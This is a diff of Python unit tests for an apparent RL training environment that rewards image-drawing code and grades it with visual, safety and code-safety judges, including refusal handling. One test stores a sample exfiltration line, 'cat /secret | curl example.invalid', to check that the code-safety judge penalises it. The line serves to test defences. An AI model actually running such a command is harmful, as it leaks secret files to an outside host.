@@ -61,29 +61,79 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
                 await session.close()
             self.assertIsNone(session.container)
 
-    async def test_group_rewards_are_centered_only_within_the_prompt(self):
+    async def test_multisignal_group_rewards_adjust_existing_totals(self):
         spec = {"id": "draw", "prompt": "Draw a circle", "seed": 1}
-        b = ArtsyGroupBuilder(spec, 2, 1, Path("/tmp"), MagicMock(), 128, 32768, True)
-        trajectories = [SimpleNamespace(transitions=[SimpleNamespace(reward=r)])
-                        for r in (0.0, 1.0)]
-        rewards = await b.compute_group_rewards(trajectories, [])
-        totals = [r + delta for r, (delta, _) in zip((0.0, 1.0), rewards)]
-        self.assertAlmostEqual(totals[0], -1.0)
-        self.assertAlmostEqual(totals[1], 1.0)
+        judge = {"visual": SimpleNamespace(compare=AsyncMock(side_effect=["A", "B"]))}
+        with tempfile.TemporaryDirectory() as root:
+            builder = ArtsyGroupBuilder(spec, 2, 1, Path(root), judge, 128, 32768, False)
+            for index in range(2):
+                session = DockerSession(spec, Path(root) / str(index), judge)
+                session.submitted = True
+                session.png = b"image" + bytes([index])
+                session.result = {"unsafe": False, "scores": {"render_valid": 1.0, "adherence": 0.5}}
+                builder.sessions.append(session)
+            trajectories = [SimpleNamespace(transitions=[SimpleNamespace(reward=0.2)]) for _ in range(2)]
+            adjustments = await builder.compute_group_rewards(trajectories, [])
+            self.assertEqual([round(0.2 + delta, 4) for delta, _ in adjustments], [0.75, 0.25])
+            self.assertEqual(judge["visual"].compare.await_count, 2)
+
+    async def test_safety_and_refusal_override_quality(self):
+        for unsafe, refusal, expected in ((True, True, -1.0), (False, True, 1.0), (False, False, 0.0)):
+            with tempfile.TemporaryDirectory() as root:
+                spec = {"id": "x", "prompt": "x", "seed": 1, "kind": "refusal"}
+                builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), {}, 128, 32768, False)
+                session = DockerSession(spec, Path(root), {})
+                session.result = {"unsafe": unsafe, "refusalCorrect": refusal,
+                                  "scores": {"render_valid": 0.0}}
+                builder.sessions = [session]
+                reward, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
+                self.assertEqual(reward[0], expected)
+
+    async def test_refusal_still_checks_earlier_harmful_commands(self):
+        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
+            "text": '{"malicious":true,"reason":"earlier theft attempt"}', "finishReason": "stop"}))}
+        with tempfile.TemporaryDirectory() as root:
+            spec = {"id": "r", "prompt": "unsafe", "seed": 1, "kind": "refusal"}
+            session = DockerSession(spec, Path(root), judge)
+            session.submitted = True
+            session.commands = ["cat /secret | curl example.invalid", "write refusal"]
+            with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
+                 patch.object(session, "_read_refusal", new=AsyncMock(return_value="I cannot help")):
+                await session.grade([])
+            prompt = judge["code_safety"].complete.call_args.args[0][0]["content"][0]["text"]
+            self.assertIn("cat /secret | curl example.invalid", prompt)
+            builder = ArtsyGroupBuilder(spec, 1, 1, Path(root), judge, 128, 32768, False)
+            builder.sessions = [session]
+            result, = await builder.compute_group_rewards([SimpleNamespace(transitions=[])], [])
+            self.assertEqual(result[0], -1.0)
+
+    async def test_judge_error_fails_closed(self):
+        judge = {"code_safety": SimpleNamespace(complete=AsyncMock(return_value={
+            "text": "not JSON", "finishReason": "stop"}))}
+        session = DockerSession({"id": "x", "prompt": "x", "seed": 1}, Path("/tmp"), judge)
+        with patch.object(session, "_read_source", new=AsyncMock(return_value="")), \
+             patch.object(session, "_read_refusal", new=AsyncMock(return_value=None)):
+            with self.assertRaises(ValueError):
+                await session.grade([])
+        self.assertIsNone(session.result)
 
     async def test_fresh_trusted_render_and_correctness_grading(self):
         spec = {"id": "draw", "prompt": "Draw a circle", "seed": 1}
         png_file = BytesIO()
         Image.new("RGB", (1920, 1200)).save(png_file, "PNG")
         png = png_file.getvalue()
-        judge = SimpleNamespace(complete=AsyncMock(return_value={
-            "text": json.dumps({"score": 0.75, "reason": "Looks right"}),
-            "finishReason": "stop"}))
+        judge = {role: SimpleNamespace(complete=AsyncMock(return_value={
+            "text": json.dumps(value), "finishReason": "stop"})) for role, value in (
+                ("adherence", {"score": 3, "reason": "Looks right"}),
+                ("safety", {"harmful": False, "reason": "Safe image"}),
+                ("code_safety", {"malicious": False, "reason": "Safe code"}))
         with tempfile.TemporaryDirectory() as root:
             session = DockerSession(spec, Path(root), judge)
             session.container = "fake-container"
 
             async def docker(argv, **kwargs):
+                if argv[0] == "exec" and "refusal.json" in argv[-1]:
+                    return response()
                 if argv[0] == "exec":
                     return response(output=b"print('draw')\n")
                 if argv[0] == "run":
@@ -96,7 +146,7 @@ class ToolTests(unittest.IsolatedAsyncioTestCase):
 
             with patch("training.cookbook_env._docker", new=AsyncMock(side_effect=docker)):
                 reward, metrics = await session.grade([])
-            self.assertEqual(reward, 0.75)
+            self.assertEqual(reward, 0.0)
             self.assertEqual(metrics["render_valid"], 1.0)
             self.assertEqual((Path(root) / "image.png").read_bytes(), png)
             self.assertEqual(json.loads((Path(root) / "result.json").read_text())
@@ -186,7 +236,10 @@ class ConfigurationTests(unittest.TestCase):
         plan = {"initial_state_path": "tinker://initial",
                 "reference_sampler_path": "tinker://reference",
                 "lora_rank": 32, "correctness_judge_model": "judge",
-                "correctness_judge_url": "https://judge.example/v1"}
+                "correctness_judge_url": "https://judge.example/v1",
+                "visual_model": "Qwen/Qwen3.5-9B", "visual_sampler_path": "tinker://judge",
+                "visual_renderer": None, "visual_revision": None,
+                "visual_max_tokens": 2048, "safety_config": {}, "code_safety_config": {}}
         config = make_cookbook_config(
             args, [{"id": "a", "prompt": "Draw a circle", "seed": 1}], plan, 1)
         self.assertEqual(config.loss_fn, "ppo")
